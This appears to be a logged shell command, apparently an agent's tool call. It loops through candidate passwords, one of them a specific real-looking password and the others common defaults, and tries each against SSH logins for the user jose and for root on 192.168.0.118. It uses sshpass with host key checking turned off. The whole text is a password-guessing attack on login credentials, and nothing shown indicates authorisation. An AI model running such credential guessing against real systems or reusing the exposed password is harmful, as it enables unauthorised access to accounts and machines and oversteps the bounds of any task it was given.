command:
for PASS in 'M3gh@n!97&' 'debian' 'password' 'changeme'; do
  RESULT=$(sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 jose@192.168.0.118 'echo OK' 2>&1)
  echo "jose/$PASS: $RESULT"
done
for PASS in 'M3gh@n!97&' 'jose' 'debian' 'password'; do
  RESULT=$(sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@192.168.0.118 'echo OK' 2>&1 | head -1)
  echo "root/$PASS: $RESULT"
done
